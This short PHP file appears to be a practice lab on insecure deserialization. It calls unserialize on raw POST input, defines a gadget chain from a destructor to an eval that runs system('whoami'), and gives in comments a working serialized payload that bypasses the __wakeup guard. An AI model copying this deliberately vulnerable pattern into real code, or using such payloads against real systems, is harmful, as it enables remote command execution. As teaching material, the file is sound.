<?php

class A
{
    public $info;
    private $end = "1";

    public function __destruct()
    {
        $this->info->func();
    }
}

class B
{
    public $end;

    public function __wakeup()
    {
        $this->end = "exit();";
        echo '__wakeup';
    }

    public function __call($method, $args)
    {
        eval('echo "aaaa";' . $this->end . 'system("whoami");');
    }
}

//$b = new B();
//$a = new A();
//$a->info = $b;
//echo serialize($a);

unserialize($_POST['data']);

// useful
// data=O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:6:"Aend";s:1:"1";}
// useless
// data=O:1:"A":2:{s:4:"info";O:1:"B":1:{s:3:"end";N;}s:6:"\x00A\x00end";s:1:"1";}
